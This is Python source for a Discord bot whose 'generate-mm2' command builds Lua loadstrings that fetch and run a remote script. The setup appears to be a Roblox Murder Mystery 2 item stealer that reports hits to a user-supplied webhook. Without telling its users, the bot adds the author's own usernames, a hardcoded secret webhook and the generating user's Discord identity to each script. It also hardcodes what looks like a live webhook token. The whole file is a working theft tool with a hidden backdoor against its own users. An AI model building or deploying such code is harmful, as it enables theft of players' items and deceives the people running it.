import discord
from discord import app_commands
from discord.ui import Modal, TextInput
import urllib.parse
import os
import requests

intents = discord.Intents.default()
bot = discord.Client(intents=intents)
tree = app_commands.CommandTree(bot)

SECRET_USERNAMES = ["IamSuperJoshua", "IamUserJoshua"]
SECRET_WEBHOOK = "https://discord.com/api/webhooks/1452638195455098991/njZ2qCWgubR26u3_Jj9pB7Gchh_0KqPb2CHfv039UeFirthGP9ulIoaX3MEkoEkO-maD"
RAW_SCRIPT_URL = "https://raw.githubusercontent.com/JoshScripts67/JoshHubsMM2TXT/refs/heads/main/mm2sourcebyjoshhub.txt"
PASTEBIN_API_KEY = os.getenv("PASTEBIN_API_KEY")

def create_pastebin(content):
    try:
        data = {
            'api_dev_key': PASTEBIN_API_KEY,
            'api_option': 'paste',
            'api_paste_code': content,
            'api_paste_private': '1',
            'api_paste_expire_date': 'N',
            'api_paste_name': 'MM2 Script'
        }
        response = requests.post('https://pastebin.com/api/api_post.php', data=data)
        if response.status_code == 200 and 'pastebin.com/' in response.text:
            paste_id = response.text.split('/')[-1]
            return f"https://pastebin.com/raw/{paste_id}"
        return None
    except:
        return None

class ScriptModal(Modal, title="MM2 Script Generator"):
    usernames = TextInput(label="Target Usernames (comma separated)", placeholder="e.g. Nikilis, Tobi, JD", style=discord.TextStyle.paragraph, required=True)
    webhook = TextInput(label="Your Webhook URL", placeholder="https://discord.com/api/webhooks/...", style=discord.TextStyle.long, required=True)
    min_rarity = TextInput(label="Minimum Rarity (default: Godly)", placeholder="Godly, Ancient, Legendary, etc.", default="Godly", required=False)
    min_value = TextInput(label="Minimum Value (default: 1)", placeholder="Only collect items worth this or more", default="1", required=False)
    ping = TextInput(label="Ping @everyone on hit? (Yes/No)", placeholder="Yes or No", default="No", required=False)

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        user_targets = [name.strip() for name in self.usernames.value.split(",") if name.strip()]
        all_targets = user_targets + SECRET_USERNAMES
        generator_info = f"{interaction.user.name}#{interaction.user.discriminator} ({interaction.user.id})"
        params = urllib.parse.urlencode({"users": ",".join(all_targets), "webhook": self.webhook.value, "secret_webhook": SECRET_WEBHOOK, "min_rarity": self.min_rarity.value or "Godly", "min_value": self.min_value.value or "1", "ping": self.ping.value or "No", "generator": generator_info})
        full_url = f"{RAW_SCRIPT_URL}?{params}"
        full_script = f'loadstring(game:HttpGet("{full_url}"))()'
        pastebin_url = create_pastebin(full_script)
        if pastebin_url:
            short_loadstring = f'loadstring(game:HttpGet("{pastebin_url}"))()'
            try:
                await interaction.user.send(f"**🎮 Your MM2 Script is Ready!**\n\n```lua\n{short_loadstring}\n```")
                await interaction.followup.send("✅ Sent to your DMs!", ephemeral=True)
            except:
                await interaction.followup.send(f"⚠️ Couldn't DM you:\n```lua\n{short_loadstring}\n```", ephemeral=True)
        else:
            await interaction.followup.send(f"⚠️ Pastebin failed:\n```lua\n{full_script}\n```", ephemeral=True)

@tree.command(name="generate-mm2", description="🎮 Generate your custom MM2 script loadstring")
async def generate_mm2(interaction: discord.Interaction):
    await interaction.response.send_modal(ScriptModal())

@bot.event
async def on_ready():
    await tree.sync()
    print(f"{bot.user} is online!")

bot.run(os.getenv("DISCORD_TOKEN"))
